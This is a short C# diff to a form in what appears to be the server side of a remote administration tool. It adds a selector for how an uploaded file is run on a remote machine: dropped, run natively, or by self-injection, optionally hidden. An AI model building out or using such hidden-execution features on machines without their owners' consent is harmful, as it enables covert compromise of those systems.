@@ -33,8 +33,24 @@ namespace xServer.Forms
 
                     Core.Misc.UploadAndExecute.FilePath = File.Exists(filePath) ? filePath : "";
                     Core.Misc.UploadAndExecute.RunHidden = chkRunHidden.Checked;
+                    Core.Misc.UploadAndExecute.Type = GetInjType();
                 }
             }
+        }
+
+        private string GetInjType()
+        {
+            string type = "drop";
+            
+            if (rbNative.Checked)
+            {
+                type = "cmd";
+            }
+            if (rbSelfInjection.Checked)
+            {
+                type = "self";
+            }
+            return type;
         }
 
         private void btnUploadAndExecute_Click(object sender, EventArgs e)
